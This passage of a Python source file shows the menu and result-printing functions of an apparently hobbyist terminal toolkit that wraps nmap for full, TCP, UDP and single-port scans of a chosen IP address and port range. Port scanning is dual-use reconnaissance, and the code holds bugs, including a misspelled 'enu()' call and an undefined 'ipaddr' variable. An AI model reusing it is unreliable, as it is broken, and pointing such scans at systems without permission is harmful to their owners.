        print(f'{Plus} Open SCTP Ports: {O}{All_SCTP}{W}')
        print(f'{Plus} Open IP Ports: {O}{All_IP}{W}')

        print()
        print('Scan finished!')
        input(f'Press {O}ENTER{W} to continue!')
        NMAPScan.menu()

    def TCPScan():

        NMAPScan.Scan()
        #Will print the data colected!
        OS()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Colected Data ************{W}')
        print(f'{Plus} Ip Status: {O}{state}{W}')
        print(f'{Plus} Port Range: {O}{portrange}{W}')
        print(f'{Plus} HostName: {O}{host}{W}')
        print(f'{Plus} Scanned Hosts: {O}{scanned_hosts}{W}')
        print(f'{Plus} Open TCP Ports: {O}{All_TCP}{W}')

        print()
        print('Scan finished!')
        input(f'Press {W}ENTER{O} to continue! ')
        NMAPScan.menu()

    def UDPScan():

        NMAPScan.Scan()
        #Will print all the info colected
        OS()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Colected Data ************{W}')
        print(f'{Plus} Ip Status: {O}{state}{W}')
        print(f'{Plus} Port Range: {O}{portrange}{W}')
        print(f'{Plus} HostName: {O}{host}{W}')
        print(f'{Plus} Scanned Hosts: {O}{scanned_hosts}{W}')
        print(f'{Plus} Open UDP Ports: {O}{All_UDP}{W}')

        print()
        print('Scan finished!')
        input(f'Press {O}ENTER{W} to continue! ')
        NMAPScan.menu()

    def SpecificPort():

        NMAPScan.Scan()

        HAS_TCP = str(nm[defaultipaddr].has_tcp(int(port)))
        HAS_UPD = str(nm[defaultipaddr].has_udp(int(port)))
        HAS_SCTP = str(nm[defaultipaddr].has_sctp(int(port)))
        #Will print the info colected!
        OS()
        print(R + Banner)
        print(G + Dead)
        print(f'{B}************ Colected Data ************{W}')
        print(f'{Plus} Ip Status: {O}{state}{W}')
        print(f'{Plus} Selected Port: {O}{port}{W}')
        print(f'{Plus} HostName: {O}{host}{W}')
        print(f'{Plus} Scanned Hosts: {O}{scanned_hosts}{W}')
        print(f'{Plus} UDP OPEN: {O}{HAS_UPD}{W}')
        print(f'{Plus} TCP OPEN: {O}{HAS_TCP}{W}')
        print(f'{Plus} SCTP OPEN: {O}{HAS_SCTP}{W}')

        print()
        print('Scan finished!')
        input(f'Press {O}ENTER{W} to continue! ')
        NMAPScan.menu()

    def menu():

        global menuoption
        global ipaddr
        global port
        global state
        global portrange
        global defaultipaddr
        global optionip
        global optionport

        with open('Data/DATA.json') as f:
            data = json.load(f)

        for DefaultInfo in data['DefaultInfo']:
            portrange = DefaultInfo['defaultportrange']
            defaultipaddr = DefaultInfo['defaultipaddress']

        OS()
        print()
        print(R + Banner)
        print(G + Dead + W)
        print(f'{B}************ NMAP Menu ************{W}')
        print('0) Return to NET menu')
        print('1) Full Network Scan')
        print('2) TCP Scan')
        print('3) UDP Scan')
        print('4) Scan for a specified port')
        print(f'{C}------------{W}')

        menuoption = int(input())

        if menuoption == 0:

            OS()
            return Menus.NET()

        if menuoption == 1:
            OS()
            print('Would you like to use the default ip? [' + defaultipaddr + ']')
            optionip = input()

            if optionip == 'Y':

                OS()
                print('Would you like to use the default port range? [' + portrange + ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.FullNetworkScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                if optionport == 'y':

                    return NMAPScan.FullNetworkScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'N':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                OS()
                print('Would you like to use the default port range? [', portrange, ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.FullNetworkScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                if optionport == 'y':

                    return  NMAPScan.FullNetworkScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'y':

                OS()
                print('Would you like to use the default port range? [' + portrange + ']')
                optionport = input()

                if optionport == 'Y':

                    nm.scan(ipaddr, portrange, '-v')

                    return NMAPScan.FullNetworkScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                if optionport == 'y':

                    return NMAPScan.FullNetworkScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'n':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                OS()
                print('Would you like to use the default port range? [', portrange, ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.FullNetworkScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                if optionport == 'y':

                    return NMAPScan.FullNetworkScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.FullNetworkScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            else:
                print('Use only Y/N or y/n')
                return NMAPScan.menu()

        if menuoption == 2:

            OS()
            print('Would you like to use the default ip? [' + defaultipaddr + ']')
            optionip = input()

            if optionip == 'Y':

                OS()
                print('Would you like to use the default port range? [' + portrange + ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.TCPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                if optionport == 'y':

                    return NMAPScan.TCPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.enu()

            if optionip == 'N':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                OS()
                print('Would you like to use the default port range? [', portrange, ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.TCPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                if optionport == 'y':

                    return  NMAPScan.TCPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'y':

                OS()
                print('Would you like to use the default port range? [' + portrange + ']')
                optionport = input()

                if optionport == 'Y':

                    nm.scan(ipaddr, portrange, '-v')

                    return NMAPScan.TCPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                if optionport == 'y':

                    return NMAPScan.TCPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'n':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                OS()
                print('Would you like to use the default port range? [', portrange, ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.TCPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                if optionport == 'y':

                    return NMAPScan.TCPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.TCPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            else:
                print('Use only Y/N or y/n')
                return NMAPScan.menu()

        if menuoption == 3:

            OS()
            print('Would you like to use the default ip? [' + defaultipaddr + ']')
            optionip = input()

            if optionip == 'Y':

                OS()
                print('Would you like to use the default port range? [' + portrange + ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.UDPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                if optionport == 'y':

                    return NMAPScan.UDPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'N':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                OS()
                print('Would you like to use the default port range? [', portrange, ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.UDPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                if optionport == 'y':

                    return  NMAPScan.UDPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'y':

                OS()
                print('Would you like to use the default port range? [' + portrange + ']')
                optionport = input()

                if optionport == 'Y':

                    nm.scan(ipaddr, portrange, '-v')

                    return NMAPScan.UDPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                if optionport == 'y':

                    return NMAPScan.UDPScan()

                if optionport == 'n':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            if optionip == 'n':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                OS()
                print('Would you like to use the default port range? [', portrange, ']')
                optionport = input()

                if optionport == 'Y':

                    return NMAPScan.UDPScan()

                if optionport == 'N':

                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')

                    return NMAPScan.UDPScan()

                if optionport == 'y':

                    return NMAPScan.UDPScan()

                if optionport == 'n':
                    OS()
                    print('Please use this format for the port range: MinPort-MaxPort')
                    portrange = input('What port range would you want me to use: ')
                    return NMAPScan.UDPScan()
                else:
                    print('Please use only Y/N or y/n')
                    return NMAPScan.menu()

            else:
                print('Use only Y/N or y/n')
                return NMAPScan.menu()

        if menuoption == 4:
            OS()
            print('Would you like to use the default ip? [' + defaultipaddr + ']')
            optionip = input()

            OS()
            port = input('Please enter the port you wanna scan: ')

            if optionip == 'Y':

                return  NMAPScan.SpecificPort()

            if optionip == 'N':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                return NMAPScan.SpecificPort()

            if optionip == 'y':

                return NMAPScan.SpecificPort()

            if optionip == 'n':

                OS()
                defaultipaddr = input('Please enter your ip address: ')

                return NMAPScan.SpecificPort()

Verify.CheckAdminPrivs()
